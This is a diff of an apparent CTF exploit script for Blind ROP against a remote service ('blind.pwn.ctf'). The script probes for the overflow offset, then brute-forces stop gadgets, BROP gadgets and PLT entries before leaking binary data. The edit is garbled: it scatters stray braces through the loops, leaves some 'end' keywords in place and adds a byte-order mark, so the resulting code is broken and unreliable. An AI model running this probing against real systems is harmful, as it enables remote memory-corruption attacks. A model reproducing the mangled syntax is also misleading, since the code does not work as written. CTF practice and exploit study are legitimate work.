@@ -1,4 +1,4 @@
-# Blind ROP exploitation - when you don't have the binary
+﻿# Blind ROP exploitation - when you don't have the binary
 # Technique: Probe for gadgets and functions remotely
 
 let host = "blind.pwn.ctf"
@@ -10,8 +10,7 @@ print("[*] Target:", host, ":", port)
 # Step 1: Find buffer overflow offset
 print("[+] Step 1: Finding crash offset...")
 
-define function check_crash(payload_len)
-    let conn = connect(host, port)
+define function check_crash(payload_len) {    let conn = connect(host, port)
     send(conn, "A" * payload_len)
     # Check if connection closes (crash) or gets response
     try
@@ -20,24 +19,20 @@ define function check_crash(payload_len)
         return false  # No crash
     catch e
         return true  # Crashed
-    end
+    }
 end
 
 let offset = 0
 for test_size in range(0, 200, 8)
-    if check_crash(test_size)
-        offset = test_size
-        break
-    end
-end
-
+    if check_crash(test_size) {        offset = test_size {        break
+    }
+}
 print("[+] Found offset:", offset)
 
 # Step 2: Find useful gadgets by brute force
 print("[+] Step 2: Searching for gadgets...")
 
-define function test_gadget(addr)
-    let conn = connect(host, port)
+define function test_gadget(addr) {    let conn = connect(host, port)
     let payload = cyclic(offset) + p64(addr)
     send(conn, payload)
     try
@@ -46,26 +41,22 @@ define function test_gadget(addr)
         return true  # Didn't crash, might be valid
     catch e
         return false  # Crashed, bad gadget
-    end
+    }
 end
 
 # Scan for stop gadget (ret or similar)
 let stop_gadget = 0
 for addr in range(0x400000, 0x401000, 0x1)
-    if test_gadget(addr)
-        stop_gadget = addr
-        print("[+] Found stop gadget:", hex(addr))
+    if test_gadget(addr) {        stop_gadget = addr {        print("[+] Found stop gadget:", hex(addr))
         break
-    end
-end
-
+    }
+}
 # Step 3: Find BROP gadget (useful for controlling registers)
 print("[+] Step 3: Searching for BROP gadget...")
 
 # BROP gadget pattern: pop multiple registers + ret
 let brop_gadget = 0
-for addr in range(0x400000, 0x402000, 0x1)
-    # Test if gadget allows us to control rdi
+for addr in range(0x400000, 0x402000, 0x1) {    # Test if gadget allows us to control rdi
     let conn = connect(host, port)
     let test = cyclic(offset) + p64(addr) + p64(0x41414141) * 6 + p64(stop_gadget)
     send(conn, test)
@@ -78,7 +69,7 @@ for addr in range(0x400000, 0x402000, 0x1)
         break
     catch e
         continue
-    end
+    }
 end
 
 # Step 4: Find PLT entries by scanning
@@ -95,16 +86,12 @@ for addr in range(0x400000, 0x401000, 0x10)
     try
         let resp = recv(conn, 1024, timeout: 2)
         # Check if we got response (successful call)
-        if len(resp) > 0
-            plt_entry = addr
-            print("[+] Found PLT entry:", hex(addr))
-            break
-        end
+        if len(resp) > 0 {            plt_entry = addr {            print("[+] Found PLT entry:", hex(addr)) {            break
+        }
     catch e
         continue
-    end
-end
-
+    }
+}
 # Step 5: Leak data using found primitives
 print("[+] Step 5: Leaking binary data...")
 
